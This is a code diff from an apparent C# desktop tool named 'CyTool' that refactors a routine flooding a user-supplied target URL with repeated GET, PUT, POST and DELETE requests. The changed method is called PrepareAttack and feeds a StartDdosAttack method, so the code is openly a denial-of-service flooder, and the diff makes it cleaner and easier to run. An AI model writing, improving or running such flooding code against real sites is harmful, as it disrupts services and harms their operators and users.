@@ -6,7 +6,6 @@ using System.Net.Http;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows;
-using System.Windows.Documents;
 
 namespace CyTool.Models
 {
@@ -17,109 +16,52 @@ namespace CyTool.Models
         public ObservableCollection<string> RequestLogs { get; set; } = new ObservableCollection<string>();
         private static readonly HttpClient client = new HttpClient(); // Singleton HttpClient
 
-        public List<Task> PrepareAttack()
+        public async Task<List<Task>> PrepareAttack()
         {
-
             if (string.IsNullOrEmpty(TargetUrl))
                 throw new InvalidOperationException("Target URL is required.");
 
-
-
             var attacks = new List<Task>();
-           
-            Parallel.ForEach(Enumerable.Range(0, Count), i =>
+
+            for (int i = 0; i < Count; i++)
             {
-                try { 
-                var attackGet = Task.Run(async () =>
-                {
-                    try
-                    {
-                        await client.GetAsync(TargetUrl);
-                    }
-                    catch (Exception ex)
-                    {
-                        await Application.Current.Dispatcher.InvokeAsync(() =>
-                        {
-                            RequestLogs.Add($"GET failed {TargetUrl}");
-                        });
-                    }
-                    await Application.Current.Dispatcher.InvokeAsync(() =>
-                    {
-                        RequestLogs.Add($"GET request sent to {TargetUrl}");
-                    });
-                });
-                if (attackGet != null)
-                    attacks.Add(attackGet);
+                // Handle GET request
+                var attackGet = SendRequestAsync(() => client.GetAsync(TargetUrl), "GET");
+                attacks.Add(attackGet);
 
-                var attackPut = Task.Run(async () =>
-                {
-                    try { 
-                    await client.PutAsync(TargetUrl, new StringContent(""));
-                    }
-                    catch (Exception ex)
-                    {
-                        await Application.Current.Dispatcher.InvokeAsync(() =>
-                        {
-                            RequestLogs.Add($"PUT failed {TargetUrl}");
-                        });
-                    }
-                    await Application.Current.Dispatcher.InvokeAsync(() =>
-                    {
-                        RequestLogs.Add($"PUT request sent to {TargetUrl}");
-                    });
-                });
-                if (attackPut != null)
-                    attacks.Add(attackPut);
+                // Handle PUT request
+                var attackPut = SendRequestAsync(() => client.PutAsync(TargetUrl, new StringContent("")), "PUT");
+                attacks.Add(attackPut);
 
-                var attackPost = Task.Run(async () =>
-                {
-                    try { 
-                    await client.PostAsync(TargetUrl, new StringContent(""));
-                    }
-                    catch (Exception ex)
-                    {
-                        await Application.Current.Dispatcher.InvokeAsync(() =>
-                        {
-                            RequestLogs.Add($"POST failed {TargetUrl}");
-                        });
-                    }
-                    await Application.Current.Dispatcher.InvokeAsync(() =>
-                    {
-                        RequestLogs.Add($"POST request sent to {TargetUrl}");
-                    });
-                });
-                if (attackPost != null)
-                    attacks.Add(attackPost);
+                // Handle POST request
+                var attackPost = SendRequestAsync(() => client.PostAsync(TargetUrl, new StringContent("")), "POST");
+                attacks.Add(attackPost);
 
-                var attackDelete = Task.Run(async () =>
-                {
-                    try { 
-                    await client.DeleteAsync(TargetUrl);
-                    }
-                    catch (Exception ex)
-                    {
-                        await Application.Current.Dispatcher.InvokeAsync(() =>
-                        {
-                            RequestLogs.Add($"DELETE failed {TargetUrl}");
-                        });
-                    }
-
-                    await Application.Current.Dispatcher.InvokeAsync(() =>
-                    {
-                        RequestLogs.Add($"DELETE request sent to {TargetUrl}");
-                    });
-                });
-                    if (attackDelete != null)
-                        attacks.Add(attackDelete);
-                }
-                catch (Exception ex)
-                {
-                    MessageBox.Show(ex.Message);
-                }
-
-            });
+                // Handle DELETE request
+                var attackDelete = SendRequestAsync(() => client.DeleteAsync(TargetUrl), "DELETE");
+                attacks.Add(attackDelete);
+            }
 
             return attacks;
+        }
+
+        private async Task SendRequestAsync(Func<Task<HttpResponseMessage>> requestFunc, string method)
+        {
+            try
+            {
+                var response = await requestFunc();
+                await Application.Current.Dispatcher.InvokeAsync(() =>
+                {
+                    RequestLogs.Add($"{method} request sent to {TargetUrl}, status code: {response.StatusCode}");
+                });
+            }
+            catch (Exception ex)
+            {
+                await Application.Current.Dispatcher.InvokeAsync(() =>
+                {
+                    RequestLogs.Add($"Error during {method} request to {TargetUrl}: {ex.Message}");
+                });
+            }
         }
 
         public async Task StartDdosAttack(List<Task> attacks)
